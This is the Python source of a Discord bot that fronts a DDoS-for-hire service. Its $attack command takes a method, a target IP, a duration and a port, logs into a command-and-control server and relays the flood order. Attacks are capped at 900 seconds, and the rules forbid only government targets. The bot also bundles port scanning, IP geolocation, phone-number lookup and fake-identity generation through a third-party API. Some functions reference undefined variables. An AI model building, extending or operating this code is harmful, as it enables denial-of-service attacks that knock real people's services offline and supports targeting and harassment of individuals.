# Version 1.0 developed by Ramses Salcedo
# Questions? Add me on Discord at Alyx#7777

import collections
import discord
from discord.ext import commands
import requests
import time
import os
import json 
import socket
import sys
from discord import User
from discord.ext.commands import has_permissions

start_time = time.time()

ver = "1.1"

# DDoS API setup
host = ""
CNCport = ""
username = ""
password = ""
shellprompt = ""

# c99.nl API setup
c99key = ""

# Discord bot token
bottoken = ""

# Bot prefix
bot = commands.Bot(command_prefix="$") 
bot.remove_command('help')

@bot.command()
async def help(self):
        help = discord.Embed(title=f"xyz Help Menu", color=0x992d22, description="Prefix $")
        help.add_field(name="▸ Attacktut", value="Shows you how to send an attack", inline=False)
        help.add_field(name="▸ Rules", value="Shows rules", inline=False)
        help.add_field(name="▸ Attack", value="Launches an attack", inline=False)
        help.add_field(name="▸ Tools", value="Shows tools", inline=False)
        help.add_field(name="▸ Changelog", value="Shows recent changelog", inline=False)
        help.add_field(name="▸ Misc", value="Shows misc", inline=False)
        help.set_footer(text="Developed by Alyx#7777")
        await self.send(embed=help)

@bot.command()
async def attacktut(ctx):
    plan = discord.Embed(title="Attack Tutorial", 
        color=0x992d22)
    plan.add_field(name="Example", value="▸ $attack [method] [ip] [time] [port]", inline=False)
    plan.set_footer(text="Developed by Alyx#7777")
    await ctx.send(embed=plan) 

@bot.command()
async def misc(ctx):
    misc = discord.Embed(title="Misc", 
        color=0x992d22)
    misc.add_field(name="Stats", value="▸ Shows the bot stats", inline=False)
    misc.add_field(name="Profile", value="▸ Shows your profile", inline=False)
    misc.set_footer(text="Developed by Alyx#7777")
    await ctx.send(embed=misc) 

@bot.command()
async def rules(ctx):
    rules = discord.Embed(title="Rules", 
        color=0x992d22)
    rules.add_field(name="Hitting government IPs", value="▸ Prohibited and you will be removed (or banned) from the bot", inline=False)
    rules.add_field(name="Trying to spam attacks", value="▸ Prohibited and you will be removed (or banned) from the bot", inline=False)
    rules.set_footer(text="Developed by Alyx#7777")
    await ctx.send(embed=rules) 

@bot.command()
async def tools(ctx):
    tools = discord.Embed(title="Tools", 
        color=0x992d22)
    tools.add_field(name="Portscan [ip]", value="▸ Portscan an IP address", inline=False)
    tools.add_field(name="GeoIP [ip]", value="▸ Geolocation of IP", inline=False)
    tools.add_field(name="Ping [ip]", value="▸ Ping a IP Address", inline=False)
    tools.add_field(name="Geninfo [male/female]", value="▸ Random person info generator", inline=False)
    tools.add_field(name="Checkweb [url]", value="▸ Checks if a host is up or down", inline=False)
    tools.add_field(name="Ip2domain [ip]", value="▸ Attempts to find websites hosted on the specific IP address", inline=False)
    tools.add_field(name="Phonelookup [country code + number]", value="▸ Get more information about any phone number", inline=False)
    tools.add_field(name="Urlshortener [url]", value="▸ Shortens the URL of any website", inline=False)
    tools.add_field(name="Mac [address]", value="▸ Search up mac address", inline=False)
    tools.set_footer(text="Developed by Alyx#7777")
    await ctx.send(embed=tools)

@bot.command()
async def changelog(ctx):
    changelog = discord.Embed(title="Changelog version 1.1", 
        color=0x992d22)
    changelog.add_field(name="Cleaned up DDoS command", value="▸ Added f strings and socket connect", inline=False)
    changelog.set_footer(text="Developed by Alyx#7777")
    await ctx.send(embed=changelog)  

# DDoS Layer 4 
@bot.command()
async def parsetocnc(vec: str, target: str, timestamp: str, port: str):
	attack = "%s %s %s dport=%s" %(vec, target, timestamp, port) # make attakck.
	print("Parsing: %s" %(attack))

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # setup socket to connect to CNC
	s.connect((host, CNCport)) # connect to CNC to send attack

	s.send("\r\n".encode()) # send new line because of the IAC negotiation

	buf = s.recv(1024) # receive/

	s.send("{}\r\n".format(username).encode()) # login with username
	time.sleep(1) # sleep for a second to give cnc time to respond
	s.send("{}\r\n".format(password).encode()) # send password to complete login
	while(True):
		buf = s.recv(1024) # recv to wait until shell prompt
		if(shellprompt in str(buf)): # wait for shell prompt to send attack
			s.send("{}\r\n".format(attack).encode()) # send attack.
			return(True)

async def parseflood(arg: str, message): # give function an argument and point it to a string (async for message.channel.send)
	try:
		attackvec = arg.split("$attack ")[1].split(" ")[0]  # get attack 
		print("Attack vec: %s" %(attackvec)) # print attack vector
		target = arg.split(" ")[2].split(" ")[0]  # get target
		print("Target: %s" %(target))
		timesec = arg.split(" ")[3].split(" ")[0]  # get time
		print("Time: %s" %(timesec))
		port = arg.split(" ")[4].split(" ")[0]  # get port
		print("port: %s" %(port))

		if(int(timesec) <= 900): # the highest amount of time the attack can be (in seconds)
			await parsetocnc(attackvec, target, timesec, port)
		else:
			await message.channel.send("Attack time too long. (900 is max)")
	except(IndexError) as err: # except if the command didn't parse correctly.
		await message.channel.send("Incorrect command format for the attack! %s" %(err))
	

@bot.event # setup asynchronous listener for on_message event
async def on_message(message): # on_message event (gets triggered when message gets sent)
	if("$attack" in message.content): # check if $attack is in the message
		await parseflood(message.content, message) # call parse flood function await it because async

# Web Tools
@bot.command()
async def portscan(self,ip): 
    portsjsonified=requests.get(f"https://api.c99.nl/portscanner?key={c99key}&host={ip}&json")
    ports=json.loads(portsjsonified.text)
    embed = discord.Embed(title='xyz PortScanner',color=0x992d22)
    embed.add_field(name='Open Ports',value=ports['port'].replace(',','\n'))
    embed.set_footer(text="Developed by Alyx#7777")
    await self.send(embed=embed)
    
@bot.command()
async def ping(self,ip):
    upordown=requests.get(f"https://api.c99.nl/ping?key={c99key}&host={ip}&json")
    resalts = json.loads(upordown.text)
    embed = discord.Embed(title='xyz Pinger',color=0x992d22)
    embed.add_field(name='Result',value='Up: '+'**'+str(resalts['success'])+'**')
    embed.add_field(name='Stats:',value=resalts['result'].replace('<br>','\n'),inline=False)
    embed.set_footer(text="Developed by Alyx#7777")
    await self.send(embed=embed)

@bot.command()
async def geoip(self,ip):
    geoip = requests.get(f"https://api.c99.nl/geoip?key={c99key}&host={ip}")
    embed=discord.Embed(title='xyz GeoIP:', color=0x992d22)
    embed.add_field(name='Geolocation information:',value=geoip.text.replace('<br>','\n'))
    embed.set_footer(text="Developed by Alyx#7777")
    await self.send(embed=embed)
 
@bot.command()
async def geninfo(self,gender):
    geninfo = requests.get(f"https://api.c99.nl/randomperson?key={c99key}&gender={gender}")
    embed=discord.Embed(title='xyz Info Generator:', color=0x992d22)
    embed.add_field(name='Generator Results:',value=geninfo.text.replace('<br>','\n'))
    embed.set_footer(text="Developed by Alyx#7777")
    await self.send(embed=embed)

@bot.command()
async def checkweb(self,website):
    checkweb = requests.get(f"https://api.c99.nl/upordown?key={c99key}&host={website}")
    embed=discord.Embed(title='xyz Website Checker:', color=0x992d22)
    embed.add_field(name='Checker Results:',value=checkweb.text.replace('<br>','\n'))
    embed.set_footer(text="Developed by Alyx#7777")
    await self.send(embed=embed)

@bot.command()
async def ip2domain(self,domain):
    ip2domain = requests.get(f"https://api.c99.nl/ip2domains?key={c99key}&ip={domain}")
    embed=discord.Embed(title='xyz Website Checker:', color=0x992d22)
    embed.add_field(name='Checker Results:',value=ip2domain.text.replace('<br>','\n'))
    embed.set_footer(text="Developed by Alyx#7777")
    await self.send(embed=embed)
 
@bot.command()
async def phonelookup(self,number):
    phonelookup = requests.get(f"https://api.c99.nl/phonelookup?key={c99key}&number={number}")
    embed=discord.Embed(title='xyz Phone Lookup:', color=0x992d22)
    embed.add_field(name='Lookup Results:',value=phonelookup.text.replace('<br>','\n'))
    embed.set_footer(text="Developed by Alyx#7777")
    await self.send(embed=embed)

@bot.command()
async def urlshortener(self,website):
    urlshortener = requests.get(f"https://api.c99.nl/urlshortener?key={c99key}&url={website}")
    embed=discord.Embed(title='xyz URL Shortener:', color=0x992d22)
    embed.add_field(name='Lookup Results:',value=urlshortener.text.replace('<br>','\n'))
    embed.set_footer(text="Developed by Alyx#7777")
    await self.send(embed=embed)

@bot.command(pass_context = True)
async def stats(ctx):
    second = time.time() - start_time
    minute, second = divmod(second, 60)
    hour, minute = divmod(minute, 60)
    day, hour = divmod(hour, 24)
    week, day = divmod(day, 7)
    embed = discord.Embed(color = 0x992d22)
    embed.add_field(name="Version", value=ver, inline=False)
    embed.add_field(name="Weeks", value=" %d"% (week), inline=False)
    embed.add_field(name="Days", value=" %d"% (day), inline=False)
    embed.add_field(name="Hours", value=" %d"% (hour), inline=False)
    embed.add_field(name="Minutes", value=" %d"% (minute), inline=False)
    embed.set_footer(text="Developed by Alyx#7777")
    await ctx.send(embed=embed)

@bot.command()
async def profile(message):
        user = message.author.id
        print(user)
        embed = discord.Embed(title="Your profile", color=0x992d22)
        embed.add_field(name="Username:", value=f"{message.author}", inline=False)
        embed.add_field(name="ID:", value=f"{message.author.id}", inline=False)
        embed.set_footer(text="Developed by Alyx#7777")
        await message.send(embed=embed)
        await ctx.send(embed=plan, file=file) 

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="anonymous"))
    print("Bot is ready!")
bot.run(bottoken)
